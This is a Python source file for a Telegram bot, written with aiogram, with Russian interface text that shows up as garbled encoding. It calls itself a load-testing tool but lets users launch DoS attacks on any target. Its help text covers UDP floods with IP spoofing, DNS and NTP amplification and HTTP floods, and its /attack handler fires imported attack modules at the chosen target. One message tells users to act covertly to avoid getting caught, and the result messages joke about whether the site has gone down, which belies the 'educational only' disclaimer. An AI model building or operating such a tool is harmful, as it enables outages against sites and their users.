import asyncio
import logging
from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from core.parser import parse_attack_command
from attacks.http_post1 import http_attack as http_post1
from attacks.http_post2 import http_attack as http_post2
from attacks.http_post3 import http_attack as http_post3
from attacks.udp import udp_attack
from keyboards import back_to_start_keyboard, back_to_help_keyboard
from aiogram.utils.markdown import hbold

router = Router()

class AttackInput(StatesGroup):
    waiting_for_missing = State()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass

    msg = await message.answer(
        "üëã –ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è –Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Å–∞–π—Ç–æ–≤.\n\n"
        "–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –∞—Ç–∞–∫—É, –∏—Å–ø–æ–ª—å–∑—É–π –∫–æ–º–∞–Ω–¥–Ω—ã–π –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä:\n\n"
        "<code>/attack ip=example.com ports=80,443 iter=5 count=100 spoof=Y agent=Y method=udp</code>\n\n"
        "‚ö† –ü–∞—Ä–∞–º–µ—Ç—Ä—ã: ip, ports, iter, count, spoof, agent, method\n\n"
        "–ï—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–Ω—è—Ç–Ω–æ —Ç–æ –∫–æ–º–∞–Ω–¥–∞ /help –≤ –ø–æ–º–æ—â—å."
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_start"})

@router.message(Command("help"))
async def cmd_help(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass

    msg = await message.answer(
        "<b>üìò –°–ø—Ä–∞–≤–∫–∞:</b>\n\n"
        "üîπ /start ‚Äî –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ\n"
        "üîπ /attack ‚Äî –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã\n"
        "üîπ /attack_parameters - –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –∞—Ç–∞–∫–∏\n"
        "üîπ /attack_example ‚Äî –ü—Ä–∏–º–µ—Ä –∫–æ–º–∞–Ω–¥—ã –∞—Ç–∞–∫–∏\n"
        "üîπ /attack_methods ‚Äî –û–±–∑–æ—Ä –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫ (UDP/HTTP)\n\n"
        "‚Ñπ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ:\n\n"
        "üî∏ /about_bot ‚Äî –ö—Ç–æ —è —Ç–∞–∫–æ–π –∏ —á–µ–º –ø–æ–ª–µ–∑–µ–Ω\n"
        "üî∏ /about_project ‚Äî –û–± –∏–¥–µ–µ –ø—Ä–æ–µ–∫—Ç–∞ –∏ —Ü–µ–ª—è—Ö\n"
        "üî∏ /settings ‚Äî –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç–µ–∫—É—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏",
        reply_markup=back_to_start_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_start"})

@router.message(Command("attack_parameters"))
async def attack_parameters(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    msg = await message.answer(
        "üìñ –û–±—É—á–µ–Ω–∏–µ: –û–±–∑–æ—Ä –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∫–æ–º–∞–Ω–¥—ã /attack\n\n"
        "–ö–æ–º–∞–Ω–¥–∞ /attack –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –≤–∏–¥—ã –Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è. –û–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –≤ –≤–∏–¥–µ –∫–ª—é—á–µ–π: \n"
        "<code>/attack ip=... ports=... iter=... count=... spoof=Y/N agent=Y/N method=udp/http http_method=post/get</code>\n\n"
        "üîç –û–ø–∏—Å–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤: \n\n"
        "‚úÖ ip=...\n"
        "–¶–µ–ª—å –∞—Ç–∞–∫–∏ ‚Äî IP, –¥–æ–º–µ–Ω –∏–ª–∏ URL (–Ω–∞–ø—Ä–∏–º–µ—Ä: example.com, 1.1.1.1).\n\n"
        "‚úÖ ports=80,443\n"
        "–°–ø–∏—Å–æ–∫ –ø–æ—Ä—Ç–æ–≤, –∫—É–¥–∞ –Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å —Ç—Ä–∞—Ñ–∏–∫. –û–±—è–∑–∞—Ç–µ–ª–µ–Ω –¥–ª—è UDP-–∞—Ç–∞–∫. –í HTTP –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø–æ—Ä—Ç —É–∫–∞–∑–∞–Ω –≤ URL (—Ä–µ–¥–∫–æ).\n\n"
        "‚úÖ iter=5\n"
        "–°–∫–æ–ª—å–∫–æ —Ä–∞–∑ –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –∞—Ç–∞–∫—É. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ü–∏–∫–ª–æ–≤ –∏–ª–∏ –ø–æ—Ä—Ü–∏–π.\n\n"
        "‚úÖ count=100\n"
        "–°–∫–æ–ª—å–∫–æ –ø–∞–∫–µ—Ç–æ–≤/–∑–∞–ø—Ä–æ—Å–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞ –æ–¥–Ω—É –∏—Ç–µ—Ä–∞—Ü–∏—é.\n–ò—Ç–æ–≥–æ: –æ–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ = iter √ó count\n\n"
        "‚úÖ spoof=Y/N\n"
        "–í–∫–ª—é—á–∞–µ—Ç IP Spoofing (–ø–æ–¥–º–µ–Ω—É IP). –†–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Å UDP.\n‚Ä¢ Y ‚Äî –≤–∫–ª—é—á–∏—Ç—å\n‚Ä¢ N ‚Äî –æ—Ç–∫–ª—é—á–∏—Ç—å (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é)\n\n"
        "‚úÖ agent=Y/N\n"
        "–î–æ–±–∞–≤–ª—è–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–µ User-Agent –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤ HTTP-–∑–∞–ø—Ä–æ—Å—ã.\n‚Ä¢ Y ‚Äî –≤–∫–ª—é—á–∏—Ç—å (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)\n‚Ä¢ N ‚Äî –≤—ã–∫–ª—é—á–∏—Ç—å\n\n"
        "‚úÖ method=udp/http\n"
        "–í—ã–±–æ—Ä –º–µ—Ç–æ–¥–∞ –∞—Ç–∞–∫–∏:\n‚Ä¢ udp ‚Äî UDP Flood –∏ Amplification —Ç–µ—Ö–Ω–∏–∫–∏\n‚Ä¢ http ‚Äî HTTP GET/POST-–∑–∞–ø—Ä–æ—Å—ã\n\n"
        "‚úÖ http_method=post/get\n"
        "–ü–æ–¥—Ç–∏–ø HTTP-–∑–∞–ø—Ä–æ—Å–∞ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é POST). –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ method=http\n\n\n"
        "‚ùó –í–ª–∏—è–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –º–µ—Ç–æ–¥–∞\n\n"
        "‚Ä¢ –í –º–µ—Ç–æ–¥–µ HTTP –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è: ip, iter, count, agent, http_method.\n–ù–æ –∏–≥–Ω–æ—Ä–∏—Ä—É—é—Ç—Å—è: spoof, ports\n\n"
        "‚Ä¢ –í –º–µ—Ç–æ–¥–µ UDP –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è: ip, ports, iter, count, spoof.\n–ù–æ –∏–≥–Ω–æ—Ä–∏—Ä—É—é—Ç—Å—è: agent, http_method\n\n\n",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})



@router.message(Command("attack_example"))
async def attack_example(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    msg = await message.answer(
        "üì¶ –ü—Ä–∏–º–µ—Ä—ã –∞—Ç–∞–∫:\n\n"
        "1. UDP Flood —Å –ø–æ–¥–º–µ–Ω–æ–π IP:\n"
        "<code>/attack ip=example.com ports=80,443 iter=5 count=100 spoof=Y agent=N method=udp</code>\n\n"
        "2. HTTP POST —Å User-Agent:\n"
        "<code>/attack ip=example.com iter=10 count=500 spoof=N agent=Y method=http http_method=post</code>\n\n"
        "3. HTTP GET —Å –º–∞–ª–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π:\n"
        "<code>/attack ip=example.com iter=1 count=20 method=http http_method=get</code>\n\n\n"
        "–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:\n"
        "‚Ä¢ –ù–µ –∑–∞–±—ã–≤–∞–π –≤—Å–µ–≥–¥–∞ —É–∫–∞–∑—ã–≤–∞—Ç—å method ‚Äî —ç—Ç–æ –∫–ª—é—á–µ–≤–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä.\n"
        "‚Ä¢ –ù–µ –∏—Å–ø–æ–ª—å–∑—É–π spoof –≤ HTTP ‚Äî –æ–Ω –±–µ—Å–ø–æ–ª–µ–∑–µ–Ω —Ç–∞–º.\n"
        "‚Ä¢ –î–ª—è UDP –∞—Ç–∞–∫ –∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ —É–∫–∞–∑—ã–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –Ω—É–∂–Ω—ã–µ –ø–æ—Ä—Ç—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, 123 –¥–ª—è NTP).\n"
        "‚Ä¢ agent=Y –∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ –ø—Ä–∏ HTTP-—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏.\n\n\n"
        "–ï—Å–ª–∏ –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç ¬´‚ùå –í—Å–µ –∑–∞–ø—Ä–æ—Å—ã –±—ã–ª–∏ –Ω–µ—É—Å–ø–µ—à–Ω—ã–º–∏. –°–µ—Ä–≤–µ—Ä –º–æ–≥ –æ—Ç–∫–ª–æ–Ω–∏—Ç—å –∏—Ö –∏–ª–∏ –±—ã—Ç—å –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω:\n"
        "- –°–µ—Ä–≤–µ—Ä –æ—Ç–≤–µ—Ç–∏–ª 403 Forbidden\n"
        "- –°–µ—Ä–≤–µ—Ä –æ—Ç–≤–µ—Ç–∏–ª 500 Internal Server Error\n"
        "- –ó–∞–ø—Ä–æ—Å –Ω–µ –¥–æ—à—ë–ª (—Å–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω / timeout / DNS –æ—à–∏–±–∫–∞ –∏ —Ç.–¥.)\n"
        "- –ü—Ä–æ–∫—Å–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–ª\n"
        "- –°–µ—Ä–≤–µ—Ä –æ—Ç–±—Ä–æ—Å–∏–ª –Ω–∞–≥—Ä—É–∑–∫—É\n"
        "- –ò–ª–∏ –∂–µ –ø—Ä–æ—Å—Ç–æ —Å–∞–π—Ç —É–∂–µ –ª–µ–≥))\n\n",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})


@router.message(Command("attack_methods"))
async def attack_methods(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    msg = await message.answer(
        "<b>üß® –ú–µ—Ç–æ–¥—ã –∞—Ç–∞–∫:</b>\n\n"
        "üîπ <b>HTTP-–∞—Ç–∞–∫–∏</b> ‚Äî —Å–æ–∑–¥–∞—é—Ç –Ω–∞–≥—Ä—É–∑–∫—É –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä, –∏–º–∏—Ç–∏—Ä—É—è —Ä–µ–∞–ª—å–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.\n"
        "‚Ä¢ <code>HTTP POST</code> ‚Äî –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º/–¥–∞–Ω–Ω—ã—Ö.\n"
        "‚Ä¢ <code>HTTP GET</code> ‚Äî –∏–º–∏—Ç–∞—Ü–∏—è –ø–µ—Ä–µ—Ö–æ–¥–æ–≤ –ø–æ —Å—Å—ã–ª–∫–∞–º.\n"
        "‚Ä¢ –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è <code>User-Agent</code> –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ –±—Ä–∞—É–∑–µ—Ä–æ–≤.\n\n"
        "üîπ <b>UDP-–∞—Ç–∞–∫–∏</b> ‚Äî –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —Å–µ—Ç–µ–≤–æ–π —É—Ä–æ–≤–µ–Ω—å (–±—ã—Å—Ç—Ä–æ –∏ —Å–ª–æ–∂–Ω–æ –æ—Ç—Å–ª–µ–¥–∏—Ç—å).\n"
        "‚Ä¢ <code>UDP Flood</code> ‚Äî –º—É—Å–æ—Ä–Ω—ã–π —Ç—Ä–∞—Ñ–∏–∫ –Ω–∞ –≤—ã–±—Ä–∞–Ω–Ω—ã–µ –ø–æ—Ä—Ç—ã.\n"
        "‚Ä¢ <code>DNS Amplification</code> ‚Äî –ø–µ—Ä–µ–≥—Ä—É–∑–∫–∞ —á–µ—Ä–µ–∑ –æ—Ç–∫—Ä—ã—Ç—ã–µ DNS-—Å–µ—Ä–≤–µ—Ä—ã.\n"
        "‚Ä¢ <code>NTP Amplification</code> ‚Äî –æ—Ç—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–∫–µ—Ç–æ–≤ –æ—Ç NTP-—Å–µ—Ä–≤–µ—Ä–æ–≤.\n"
        "‚Ä¢ <code>Chargen / SNMP / SSDP / TFTP Flood</code> ‚Äî –∞—Ç–∞–∫–∏ —á–µ—Ä–µ–∑ —É—è–∑–≤–∏–º—ã–µ —Å–ª—É–∂–±—ã.\n\n"
        "‚öôÔ∏è –í—Å–µ –º–µ—Ç–æ–¥—ã –º–æ–∂–Ω–æ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å —á–µ—Ä–µ–∑ <code>/attack</code> —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})

@router.message(Command("about_bot"))
async def about_bot(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: pass

    msg = await message.answer(
        "<b>ü§ñ –û –±–æ—Ç–µ:</b>\n\n"
        "–Ø ‚Äî Telegram-–±–æ—Ç, —Å–æ–∑–¥–∞–Ω–Ω—ã–π –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è <u>–Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è</u> –≤–µ–±-—Å–µ—Ä–≤–∏—Å–æ–≤ –∏ –∏–∑—É—á–µ–Ω–∏—è DoS-—Ç–µ—Ö–Ω–∏–∫ –≤ —É—á–µ–±–Ω—ã—Ö —Ü–µ–ª—è—Ö.\n\n"
        "üîç –ú–æ–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:\n"
        "‚Ä¢ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ HTTP –∏ UDP –∞—Ç–∞–∫\n"
        "‚Ä¢ –†–∞–∑–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏: Flood, Amplification, Spoofing\n"
        "‚Ä¢ –†–∞–±–æ—Ç–∞ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, –≥–∏–±–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞\n"
        "‚Ä¢ –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–µ –º–µ–Ω—é –∏ –∫–æ–º–∞–Ω–¥—ã\n\n"
        "‚ö†Ô∏è <b>–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ:</b>\n"
        "–í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –¥–æ–ª–∂–Ω—ã –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —Å–∫—Ä—ã—Ç–Ω–æ –∏ –Ω–µ–ø–∞–ª–µ–≤–Ω–æ)) –∏–Ω–∞—á–µ —Ä–∏—Å–∫—É–µ—à—å –±—ã—Ç—å –ø–æ–π–º–∞–Ω–Ω—ã–º.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})

@router.message(Command("about_project"))
async def about_project(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: pass

    msg = await message.answer(
        "<b>üìÇ –û–± –∏–¥–µ–µ –ø—Ä–æ–µ–∫—Ç–∞:</b>\n\n"
        "üîß –≠—Ç–æ—Ç –±–æ—Ç ‚Äî —á–∞—Å—Ç—å <b>—É—á–µ–±–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞ –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</b> –∏ –Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–º—É —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—é.\n"
        "–¶–µ–ª—å: –∏–∑—É—á–∏—Ç—å, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç—Ä–∞—Ñ–∏–∫, –∫–∞–∫–∏–µ –±—ã–≤–∞—é—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∏ –∫–∞–∫ –≤—ã—Å—Ç—Ä–∞–∏–≤–∞—Ç—å –∑–∞—â–∏—Ç—É.\n\n"
        "üß† –í–∫–ª—é—á–∞–µ—Ç:\n"
        "‚Ä¢ –†–∞–∑–Ω—ã–µ —É—Ä–æ–≤–Ω–∏ –∞—Ç–∞–∫ (HTTP, UDP)\n"
        "‚Ä¢ –ú–æ–¥—É–ª—å–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É\n"
        "‚Ä¢ –°–∏—Å—Ç–µ–º—É –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∏ —Å–ø—É—Ñ–∏–Ω–≥\n"
        "‚Ä¢ –†–∞–±–æ—Ç–∞ —Å URL/IP/–ø–æ—Ä—Ç–∞–º–∏\n\n"
        "üìå –ü—Ä–æ–µ–∫—Ç <b>–Ω–µ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –¥–ª—è –¥–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π</b> ‚Äî —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –∏ –æ–±—É—á–µ–Ω–∏—è.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})

@router.message(Command("settings"))
async def settings_view(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: pass

    spoofing_default = "None."
    agent_default = "None"
    concurrency = "None"

    msg = await message.answer(
        "<b>‚öôÔ∏è –¢–µ–∫—É—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏:</b>\n\n"
        f"‚Ä¢ IP Spoofing: <b>{spoofing_default}</b>\n"
        f"‚Ä¢ User-Agent: <b>{agent_default}</b>\n"
        f"‚Ä¢ –ö–æ–ª-–≤–æ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö HTTP-–∑–∞–ø—Ä–æ—Å–æ–≤: <b>{concurrency}</b>\n"
        "‚Ä¢ –§–æ—Ä–º–∞—Ç –≤–≤–æ–¥–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤: <code>/attack ip=... ports=... iter=... count=...</code>\n\n"
        "–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±—É–¥—É—Ç —Ä–∞—Å—à–∏—Ä—è—Ç—å—Å—è –≤ –±—É–¥—É—â–µ–º.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})


@router.callback_query(F.data == "back_to_start")
async def back_to_start(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await callback.bot.delete_message(callback.message.chat.id, msg_id)
        except:
            pass

    previous_handler = data.get("previous_handler")
    
    if previous_handler == "cmd_help":
        await cmd_help(callback.message, state)
    elif previous_handler == "cmd_start":
        await cmd_start(callback.message, state)
    elif previous_handler == "attack_parameters":
        await attack_parameters(callback.message, state)
    elif previous_handler == "attack_example":
        await attack_example(callback.message, state)
    else:
        await cmd_start(callback.message, state)


@router.callback_query(F.data == "back_to_help")
async def back_to_help(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    
    if msg_id := data.get("msg_id"):
        try:
            await callback.bot.delete_message(callback.message.chat.id, msg_id)
        except:
            pass

    previous_handler = data.get("previous_handler")
    
    if previous_handler == "cmd_help":
        await cmd_help(callback.message, state)
    elif previous_handler == "cmd_start":
        await cmd_start(callback.message, state)
    elif previous_handler == "attack_parameters":
        await attack_parameters(callback.message, state)
    elif previous_handler == "attack_example":
        await attack_example(callback.message, state)
    else:
        await cmd_start(callback.message, state)




@router.message(Command("attack"))
async def cmd_attack(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    args_text = message.text.replace("/attack", "").strip()

    if not args_text:
        msg = await message.answer("–ù–µ —É–∫–∞–∑–∞–Ω—ã –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∞—Ç–∞–∫–∏. –ü—Ä–∏–º–µ—Ä:\n"
                             "/attack ip=1.1.1.1 ports=80,443 iter=5 count=100 spoof=Y agent=Y method=udp",
                             reply_markup=back_to_start_keyboard())
        return await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_start"})

    try:
        params = parse_attack_command(args_text)
    except ValueError as e:
        await message.answer(f"–û—à–∏–±–∫–∞ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö: {e}", reply_markup=back_to_start_keyboard())
        return

    http_display = f"{params['method'].upper()}/{params['technique'].upper()}"
    await message.answer(
        f"üöÄ –ó–∞–ø—É—Å–∫–∞–µ–º –∞—Ç–∞–∫—É —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏:\n"
        f"<b>–¶–µ–ª—å:</b> {params['ip']}\n"
        f"<b>–ü–æ—Ä—Ç—ã:</b> {params['ports']}\n"
        f"<b>–ò—Ç–µ—Ä–∞—Ü–∏–∏:</b> {params['iter']}\n"
        f"<b>–ü–∞–∫–µ—Ç–æ–≤ –Ω–∞ –∏—Ç–µ—Ä–∞—Ü–∏—é:</b> {params['count']}\n"
        f"<b>–°–ø—É—Ñ–∏–Ω–≥:</b> {'–î–∞' if params['spoof'] else '–ù–µ—Ç'}\n"
        f"<b>User-Agent:</b> {'–î–∞' if params['agent'] else '–ù–µ—Ç'}\n"
        f"<b>–ú–µ—Ç–æ–¥:</b> {http_display}")
    
    if params['method'] == "http":
        http_method = params.get('technique', 'post')

        if http_method == "post1":
            success, total = await http_post1(
                user_id=message.from_user.id,
                target_url=params['ip'],
                num_requests=params['count'] * params['iter'],
                user_agent=params['agent']
            )
        elif http_method == "post2":
            success, total = await http_post2(
                user_id=message.from_user.id,
                target_url=params['ip'],
                num_requests=params['count'] * params['iter'],
            )
        elif http_method == "post3":
            success, total = await http_post3(
                user_id=message.from_user.id,
                target_url=params['ip'],
                num_requests=params['count'] * params['iter'],
                user_agent=params['agent']
            )
        else:
            await message.answer("‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞ HTTP-–∞—Ç–∞–∫–∏. –î–æ–ø—É—Å—Ç–∏–º—ã–µ: post1, post2, post3")
            return

        percent = round((success / total) * 100, 2) if total else 0

        if success == 0:
            result = "‚ùå –í—Å–µ –∑–∞–ø—Ä–æ—Å—ã –±—ã–ª–∏ –Ω–µ—É—Å–ø–µ—à–Ω—ã–º–∏. –°–µ—Ä–≤–µ—Ä –º–æ–≥ –æ—Ç–∫–ª–æ–Ω–∏—Ç—å –∏—Ö –∏–ª–∏ –±—ã—Ç—å –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω? –î–∞ –∫–æ–≥–æ –æ–Ω–æ –≤–æ–ª–Ω—É–µ—Ç, –≥–ª–∞–≤–Ω–æ–µ —Ç–µ–ø–µ—Ä—å –ø—Ä–æ–≤–µ—Ä—å —Å–∞–π—Ç, –≤—Å—Ç–∞–ª –ª–∏ –æ–Ω..."
        elif success < total * 0.3:
            result = "‚ö†Ô∏è –ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ –±—ã–ª–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω—ã. –í–æ–∑–º–æ–∂–Ω–∞ –∑–∞—â–∏—Ç–∞ –∏–ª–∏ –æ—à–∏–±–∫–∞ –ø—Ä–æ–∫—Å–∏? –î–∞ –∫–æ–≥–æ –æ–Ω–æ –≤–æ–ª–Ω—É–µ—Ç, –≥–ª–∞–≤–Ω–æ–µ —Ç–µ–ø–µ—Ä—å –ø—Ä–æ–≤–µ—Ä—å —Å–∞–π—Ç, –≤—Å—Ç–∞–ª –ª–∏ –æ–Ω..."
        else:
            result = "‚úÖ –ê—Ç–∞–∫–∞ –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ. –ú–æ–∏ –ø–æ–∑–¥—Ä–∞–≤–ª–µ–Ω–∏—è))"

        await message.answer(
            f"<b>üìä –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</b>\n"
            f"–ú–µ—Ç–æ–¥: HTTP ({http_method.upper()})\n"
            f"–¶–µ–ª—å: {params['ip']}\n"
            f"–£—Å–ø–µ—à–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤: {success} –∏–∑ {total} ({percent}%)\n"
            f"–†–µ–∑—É–ª—å—Ç–∞—Ç: {result}"
        )


    
